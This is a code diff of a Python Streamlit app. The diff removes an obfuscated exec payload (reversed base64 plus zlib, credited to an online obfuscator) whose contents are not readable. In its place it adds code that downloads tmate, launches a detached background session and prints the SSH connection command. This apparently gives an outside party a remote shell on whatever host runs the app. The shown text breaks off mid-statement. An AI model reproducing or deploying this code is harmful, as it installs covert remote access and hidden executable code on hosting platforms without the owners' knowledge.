@@ -1,4 +1,129 @@
+import os
+import sys
+import subprocess
+import time
+import signal
+from pathlib import Path
+import requests
+from datetime import datetime
+import streamlit as st
+import tarfile
+import io
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+# 配置
+TMATE_VERSION = "2.4.0"  # 使用最新稳定版本
+TMATE_DOWNLOAD_URL = f"https://github.com/tmate-io/tmate/releases/download/{TMATE_VERSION}/tmate-{TMATE_VERSION}-static-linux-amd64.tar.xz"
+USER_HOME = Path.home()
+SSH_INFO_FILE = "/tmp/ssh.txt"  # 保存到临时目录
+
+class TmateManager:
+    def __init__(self):
+        self.tmate_dir = USER_HOME / "tmate"
+        self.tmate_path = self.tmate_dir / "tmate"
+        self.ssh_info_path = Path(SSH_INFO_FILE)
+        self.tmate_process = None
+        self.session_info = {}
+        
+    def download_tmate(self):
+        """从官方GitHub下载并安装tmate"""
+        st.info("正在下载并安装tmate...")
+        
+        # 创建tmate目录
+        self.tmate_dir.mkdir(exist_ok=True)
+        
+        try:
+            # 下载tmate压缩包
+            response = requests.get(TMATE_DOWNLOAD_URL, stream=True)
+            response.raise_for_status()
+            
+            # 使用内存中的字节流处理压缩包
+            with io.BytesIO(response.content) as tar_stream:
+                # 使用tarfile解压
+                with tarfile.open(fileobj=tar_stream, mode="r:xz") as tar:
+                    # 提取tmate二进制文件
+                    tar.extract("tmate-2.4.0-static-linux-amd64/tmate", path=str(self.tmate_dir))
+            
+            # 重命名并设置权限
+            extracted_path = self.tmate_dir / "tmate-2.4.0-static-linux-amd64" / "tmate"
+            if extracted_path.exists():
+                extracted_path.rename(self.tmate_path)
+                os.chmod(self.tmate_path, 0o755)
+            
+            # 清理临时目录
+            subprocess.run(["rm", "-rf", str(self.tmate_dir / "tmate-2.4.0-static-linux-amd64")])
+            
+            # 验证安装
+            if self.tmate_path.exists() and os.access(self.tmate_path, os.X_OK):
+                st.success(f"✓ tmate已安装到: {self.tmate_path}")
+                return True
+            else:
+                st.error("✗ tmate安装失败")
+                return False
+            
+        except Exception as e:
+            st.error(f"✗ 下载或安装tmate失败: {e}")
+            return False
+    
+    def start_tmate(self):
+        """启动tmate并获取会话信息"""
+        st.info("正在启动tmate...")
+        try:
+            # 确保tmate文件存在
+            if not self.tmate_path.exists():
+                st.error("tmate文件不存在，请先安装")
+                return False
+                
+            # 启动tmate进程 - 分离模式，后台运行
+            self.tmate_process = subprocess.Popen(
+                [str(self.tmate_path), "-S", "/tmp/tmate.sock", "new-session", "-d"],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                start_new_session=True
+            )
+            
+            # 等待tmate启动
+            time.sleep(3)
+            
+            # 获取会话信息
+            self.get_session_info()
+            
+            # 验证tmate是否在运行
+            try:
+                result = subprocess.run(
+                    [str(self.tmate_path), "-S", "/tmp/tmate.sock", "list-sessions"],
+                    capture_output=True, text=True, timeout=5
+                )
+                if result.returncode == 0:
+                    st.success("✓ Tmate后台进程运行中")
+                    return True
+                else:
+                    st.error("✗ Tmate后台进程验证失败")
+                    return False
+            except Exception as e:
+                st.error(f"✗ 验证tmate进程失败: {e}")
+                return False
+            
+        except Exception as e:
+            st.error(f"✗ 启动tmate失败: {e}")
+            return False
+    
+    def get_session_info(self):
+        """获取tmate会话信息"""
+        try:
+            # 获取可写SSH会话
+            result = subprocess.run(
+                [str(self.tmate_path), "-S", "/tmp/tmate.sock", "display", "-p", "#{tmate_ssh}"],
+                capture_output=True, text=True, timeout=10
+            )
+            if result.returncode == 0:
+                self.session_info['ssh'] = result.stdout.strip()
+                
+            # 显示会话信息
+            if self.session_info.get('ssh'):
+                st.success("✓ Tmate会话已创建:")
+                st.info(f"SSH连接命令: {self.session_info['ssh']}")
+            else:
+                st.error("✗ 未能获取到SSH会话信息")
+                # 尝试获取其他会话信息作为备选
+                result = subprocess.run(
+                    [str]()
